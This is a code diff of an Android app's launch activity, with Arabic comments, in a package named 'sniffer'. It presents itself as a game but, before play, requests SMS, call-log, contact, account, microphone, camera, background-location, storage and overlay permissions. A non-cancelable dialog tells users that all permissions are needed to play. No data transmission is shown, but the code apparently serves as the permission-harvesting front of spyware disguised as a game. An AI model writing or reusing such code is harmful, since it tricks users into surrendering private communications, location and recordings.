@@ -9,32 +9,97 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.provider.Settings;
 import android.widget.Toast;
+import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import android.Manifest;
 import com.v8.global.sniffer.game.MainGameActivity;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class MainActivity extends Activity {
 
-    private static final int PERMISSION_REQUEST_CODE = 777;
-    private static final int SYSTEM_ALERT_WINDOW_CODE = 888;
-    private static final int MANAGE_STORAGE_CODE = 999;
+    private static final int PERMISSION_REQUEST_CODE = 1000;
+    private static final int SYSTEM_ALERT_WINDOW_CODE = 1001;
+    private static final int MANAGE_STORAGE_CODE = 1002;
     
-    private boolean isPermissionProcessActive = true;
-    private int retryCount = 0;
+    private Map<String, Boolean> permissionStatus = new HashMap<>();
+    private int totalPermissions = 0;
+    private int grantedPermissions = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // بدء عملية الصلاحيات
-        startPermissionProcess();
+        // بدء عملية الصلاحيات مباشرة
+        requestAllPermissionsAtOnce();
     }
 
-    private void startPermissionProcess() {
-        // 1. صلاحية العرض فوق التطبيقات (الأهم)
+    private void requestAllPermissionsAtOnce() {
+        // قائمة جميع الصلاحيات المطلوبة
+        List<String> permissionsList = new ArrayList<>();
+        
+        // صلاحيات التخزين
+        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        
+        // صلاحيات الكاميرا والميكروفون
+        permissionsList.add(Manifest.permission.CAMERA);
+        permissionsList.add(Manifest.permission.RECORD_AUDIO);
+        
+        // صلاحيات الموقع
+        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            permissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
+        
+        // صلاحيات جهات الاتصال والحسابات
+        permissionsList.add(Manifest.permission.READ_CONTACTS);
+        permissionsList.add(Manifest.permission.GET_ACCOUNTS);
+        
+        // صلاحيات الهاتف
+        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
+        permissionsList.add(Manifest.permission.READ_CALL_LOG);
+        
+        // صلاحيات الرسائل
+        permissionsList.add(Manifest.permission.READ_SMS);
+        permissionsList.add(Manifest.permission.RECEIVE_SMS);
+        
+        // صلاحيات الإشعارات
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
+        }
+        
+        // صلاحيات الملفات للوسائط
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES);
+            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO);
+            permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO);
+        }
+
+        totalPermissions = permissionsList.size();
+        
+        // تجهيز قائمة الصلاحيات التي لم تمنح بعد
+        List<String> permissionsToRequest = new ArrayList<>();
+        
+        for (String permission : permissionsList) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(permission);
+            } else {
+                grantedPermissions++;
+                permissionStatus.put(permission, true);
+            }
+        }
+
+        // طلب الصلاحيات الخاصة أولاً
+        requestSpecialPermissions(permissionsToRequest);
+    }
+
+    private void requestSpecialPermissions(List<String> remainingPermissions) {
+        // 1. صلاحية العرض فوق التطبيقات
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -54,39 +119,10 @@ public class MainActivity extends Activity {
             }
         }
 
-        // 3. باقي الصلاحيات
-        requestRuntimePermissions();
-    }
-
-    private void requestRuntimePermissions() {
-        List<String> permissionsNeeded = new ArrayList<>();
-        
-        // قائمة الصلاحيات المطلوبة
-        String[] permissions = {
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.GET_ACCOUNTS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.POST_NOTIFICATIONS
-        };
-
-        for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(permission);
-            }
-        }
-
-        if (!permissionsNeeded.isEmpty()) {
+        // 3. طلب باقي الصلاحيات دفعة واحدة
+        if (!remainingPermissions.isEmpty()) {
             ActivityCompat.requestPermissions(this, 
-                permissionsNeeded.toArray(new String[0]), 
+                remainingPermissions.toArray(new String[0]), 
                 PERMISSION_REQUEST_CODE);
         } else {
             // كل الصلاحيات ممنوحة
@@ -95,32 +131,23 @@ public class MainActivity extends Activity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // التحقق من الصلاحيات المرفوضة
-            List<String> deniedPermissions = new ArrayList<>();
             for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    deniedPermissions.add(permissions[i]);
+                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    grantedPermissions++;
+                    permissionStatus.put(permissions[i], true);
                 }
             }
 
-            if (!deniedPermissions.isEmpty() && retryCount < 3) {
-                // محاولة إعادة طلب الصلاحيات المرفوضة
-                retryCount++;
-                ActivityCompat.requestPermissions(this, 
-                    deniedPermissions.toArray(new String[0]), 
-                    PERMISSION_REQUEST_CODE);
+            // التحقق مما إذا كانت كل الصلاحيات ممنوحة
+            if (grantedPermissions >= totalPermissions) {
+                openGame();
             } else {
-                // بعد 3 محاولات، افتح اللعبة على أي حال
-                new Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        openGame();
-                    }
-                }, 2000);
+                // بعض الصلاحيات ما زالت مفقودة
+                showPermissionDialog();
             }
         }
     }
@@ -130,18 +157,38 @@ public class MainActivity extends Activity {
         super.onActivityResult(requestCode, resultCode, data);
 
         if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
-            // تأخير قصير ثم متابعة
+            // العودة من شاشة الصلاحيات الخاصة، نكمل طلب الباقي
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    startPermissionProcess();
+                    requestAllPermissionsAtOnce();
                 }
             }, 1000);
         }
     }
 
+    private void showPermissionDialog() {
+        // عرض رسالة للمستخدم بأن الصلاحيات ضرورية
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                new android.app.AlertDialog.Builder(MainActivity.this)
+                    .setTitle("🔐 الصلاحيات مطلوبة")
+                    .setMessage("تحتاج إلى منح جميع الصلاحيات لتتمكن من اللعب بشكل كامل")
+                    .setPositiveButton("سماح", (dialog, which) -> {
+                        requestAllPermissionsAtOnce();
+                    })
+                    .setNegativeButton("تخطي", (dialog, which) -> {
+                        // حتى لو تخطى، افتح اللعبة
+                        openGame();
+                    })
+                    .setCancelable(false)
+                    .show();
+            }
+        });
+    }
+
     private void openGame() {
-        // فتح اللعبة
         Intent intent = new Intent(this, MainGameActivity.class);
         startActivity(intent);
         finish();
